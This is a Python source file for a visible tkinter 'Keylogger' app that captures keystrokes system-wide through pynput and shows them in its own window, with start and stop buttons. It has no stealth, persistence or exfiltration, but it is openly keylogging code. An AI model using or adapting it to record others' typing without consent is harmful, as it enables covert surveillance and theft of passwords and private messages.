import tkinter as tk
from pynput.keyboard import Listener

class KeyloggerApp:
    def __init__(self, master):
        self.master = master
        master.title("Keylogger")

        self.log_text = tk.Text(master, height=10, width=50)
        self.log_text.pack()

        self.start_button = tk.Button(master, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack()

        self.quit_button = tk.Button(master, text="Quit", command=master.quit)
        self.quit_button.pack()

        self.log = ""

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == key.space:
                self.log += " "
            else:
                self.log += " " + str(key) + " "

        self.log_text.insert(tk.END, self.log[-1])

    def start_keylogger(self):
        self.log_text.delete(1.0, tk.END)
        self.log_text.insert(tk.END, "Keylogger started...\n")

        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_keylogger(self):
        self.listener.stop()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log_text.insert(tk.END, "\nKeylogger stopped.\n")

def main():
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
